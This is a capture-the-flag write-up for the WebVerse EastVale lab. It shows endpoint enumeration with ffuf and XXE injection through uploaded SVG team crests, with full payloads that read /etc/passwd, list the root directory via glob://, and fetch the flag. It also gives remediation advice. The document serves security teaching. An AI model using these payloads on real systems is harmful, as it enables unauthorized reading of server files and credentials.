# EastVale Youth Soccer League — XXE via SVG Crest Upload

[WebVerse - EastVale](https://dashboard.webverselabs-pro.com/seasons/season-of-the-awakening/eastvale)

## Target
- **Host:** `eastvale.local`
- **Lab:** WebVerse Pro — Season of the Awakening — EastVale (Easy)

## 1. Recon — Directory/Endpoint Enumeration

Ran `ffuf` against the web root to discover hidden paths, with recursion enabled so that once a directory was found, `ffuf` would automatically re-scan inside it for further endpoints.

```bash
ffuf -u http://eastvale.local/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt \
  -fc 404 \
  -recursion \
  -recursion-depth 2
```

**Flags used:**
- `-u` — target URL with `FUZZ` as the injection point
- `-w` — wordlist path
- `-fc 404` — filter out responses with HTTP status 404, showing only valid hits
- `-recursion` — automatically re-fuzzes any discovered directory (e.g. once `/admin/` is found, it appends `FUZZ` again and scans `/admin/FUZZ`)
- `-recursion-depth 2` — limits how many levels deep recursion goes, preventing it from recursing indefinitely

**Result:**
- First pass found `/admin`
- Recursion automatically scanned inside `/admin/` and found `/teams`

Giving the full discovered path:

```
http://eastvale.local/admin/teams
```

This resolved to an internal admin tool — **"Manage teams"** — used for roster and club crest (SVG) administration, backed by an API at `/admin/api/v3/`.

## 2. Discovery — SVG Upload Surface

The admin panel allows uploading a **Club Crest (SVG)** per team, submitted via:

```
POST /admin/api/v3/teams/{slug}/crest
```

Since SVG is XML-based, this upload field was a candidate for **XXE (XML External Entity) injection**.

## 3. Exploitation — Crafting the XXE Payload

Created a malicious SVG with a DOCTYPE declaring an external entity pointing at `/etc/passwd`:

```bash
cat > xxe.svg << 'EOF'
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>
EOF
```

- The `<!DOCTYPE>` block defines an external entity `xxe` that resolves to the contents of `/etc/passwd` on the server.
- The `&xxe;` reference inside the `<text>` element causes the parser to expand the entity and embed the file contents into the SVG's text node.

## 4. Upload

Uploaded the crafted SVG as the crest for the `riverside-rovers` team via the admin panel upload form.

```bash
curl -s -F "crest=@xxe.svg;filename=xxe.svg;type=image/svg+xml" \
  http://eastvale.local/admin/api/v3/teams/riverside-rovers/crest
```

**Response:**

```json
{
  "ok": true,
  "slug": "riverside-rovers",
  "bytes": 208
}
```

Upload accepted — confirms the server received and stored the file.

## 5. Triggering the XXE — Roster PDF

The public site (`http://eastvale.local/teams.php`) lists all teams by division and offers a **Roster PDF** download per team. This roster generator reads the stored crest SVG and embeds its content (including the "Club crest" field) into the generated PDF — this is where the external entity gets parsed and expanded server-side.

Open the roster PDF for Riverside Rovers or the team where the svg was uploaded and inspected its raw content:


## 6. Result — Confirmed XXE / Local File Read

The generated PDF's "Club crest:" field contained the full contents of `/etc/passwd`, confirming the XXE successfully read an arbitrary local file from the server:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

## 7. Pivoting — Locating the Flag

With local file read confirmed, moved on from `/etc/passwd` to guessing files directly in the root directory.

To enumerate what exists at `/` before guessing blindly, the `glob://` PHP stream wrapper can be used in place of `file://` to list directory contents:

```bash
cat > xxe-glob-root.svg << 'EOF'
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "glob:///*"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>
EOF
```

- `file://` only returns the content of an actual file and does not list directories.
- `glob:///*` resolves the pattern server-side (PHP-specific wrapper) and returns the matching paths directly under `/`, giving a directory listing instead of a single file's contents.

Checked for a container entrypoint script, a common artifact in dockerized CTF environments that often references the flag's location:

```bash
cat > xxe-entry.svg << 'EOF'
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///entrypoint.sh"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>
EOF
```

Then attempted to read the flag directly at the root directory:

```bash
cat > xxe-flag.svg << 'EOF'
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>
EOF
```

Each payload was uploaded via the same crest upload endpoint, then triggered by downloading the team's Roster PDF to view the expanded entity content.

#### `WEBVERSE{******************}`

## Root Cause

The backend PDF-generation component parses uploaded SVG files as XML without disabling DTD processing / external entity resolution, allowing arbitrary local file disclosure via a crafted `<!DOCTYPE>` with a `SYSTEM` entity.

## Remediation

- Disable DTD and external entity processing in the XML/SVG parser (e.g. `libxml_disable_entity_loader(true)` in PHP, or configure the XML parser to reject `DOCTYPE` declarations entirely).
- Validate/sanitize uploaded SVGs against an allow-list of safe elements (strip `<!DOCTYPE>`, `<script>`, and external references) before processing or rendering.
- Run the SVG/PDF generation step in a sandboxed environment with no access to sensitive filesystem paths.
